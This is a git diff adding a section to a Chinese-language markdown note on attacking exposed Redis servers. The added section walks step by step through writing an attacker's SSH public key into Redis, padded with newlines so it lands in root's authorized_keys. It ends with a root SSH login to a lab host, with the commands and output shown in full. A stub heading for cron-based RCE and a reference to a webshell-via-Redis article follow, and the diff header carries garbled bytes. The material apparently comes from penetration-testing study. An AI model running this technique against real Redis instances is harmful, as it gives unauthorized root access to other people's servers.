@@ -80,6 +80,80 @@ redis-bits󿿀򳨭eused-memÐ
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 ```
 
+### 写入攻击者公钥实现rce
+先生成公私钥对：
+```
+$ ssh-keygen -t rsa
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/77/.ssh/id_rsa): /home/77/.ssh/redis_id_rsa
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /home/77/.ssh/redis_id_rsa.
+Your public key has been saved in /home/77/.ssh/redis_id_rsa.pub.
+The key fingerprint is:
+SHA256:ostXG7ywBhLm9vwOeJYn56d6W8mEJBnzFyQXGYYXCN8 77@ubuntu130
+The key's randomart image is:
++---[RSA 2048]----+
+|    +..+O=       |
+|     *o=o.       |
+|    o +.E        |
+|  o  o o         |
+| o .  o.S        |
+|  +..o.++.       |
+| ..+B.o+++       |
+|   +oB=.+        |
+|    +B*+         |
++----[SHA256]-----+
+
+$ ll /home/77/.ssh/
+total 28K
+drwx------  2 77 77 4.0K Jan 11 00:06 ./
+-rw-------  1 77 77 1.8K Jan 11 00:06 redis_id_rsa
+-rw-r--r--  1 77 77  394 Jan 11 00:06 redis_id_rsa.pub
+```
+
+然后将公钥写到authorized_key文件里，注意如果直接写入，或者前后加空格写入，是不能起效果的。需要将公钥写入到文件，然后在文件前后加上换行符。
+```
+# (echo -e "\n\n\n\n"; cat redis_id_rsa.pub; echo -e "\n\n\n\n") > test.pub
+root@ubuntu:~/.ssh# cat test.pub |redis-cli -x set 344444
+OK
+```
+再连接redis确认这个值是否写入了换行符：
+```
+$ redis-cli
+127.0.0.1:6379> get 344444
+"\n\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQChQBXUegXtU6HK7F9MKuWDPgKNt8Y2h2FNtg14x5qeX9mRrlurytc4dNPvmpuuNZY0yDBi2QAK4Py7bfBbRWLvcFWALoRcXfPobQzRk3beWzWifVZm9iibahqOGgmfKN1DJ5/KTvEHgtGmWOLAjr2ddy5HUnwXSjb3KBgJqdsvt+eQFWHZLDSFem5oU1hni+a/5tVFhciif5AFCpq8e1F+4RrqIGtfOj4IrW3PrqCWJUI60IUgL4MjYqBIf7sctMgGO6Ezlg86Eo8bPdpUh3ygooB6FOJaWqEiB9Kd1gEUIgaj5C/5Dt3McwTzUliJ8DhZ7dw5kUt1mC9hd3oz+AzR 77@ubuntu130\n\n\n\n\n"
+127.0.0.1:6379> save
+OK
+```
+从攻击者机器向redis所在的ssh服务发起连接：
+```
+$ ssh root@192.168.85.129 -i ~/.ssh/redis_id_rsa
+Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-54-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+ * Introducing self-healing high availability clusters in MicroK8s.
+   Simple, hardened, Kubernetes for production, from RaspberryPi to DC.
+
+     https://microk8s.io/high-availability
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+New release '20.04.1 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+You have new mail.
+Last login: Mon Jan 11 00:04:44 2021 from 192.168.85.130
+root@ubuntu:~#
+```
+
+
+### 通过计划任务实现RCE
+//TODO
 
 ### 参考
 - [利用redis写webshell](https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html)
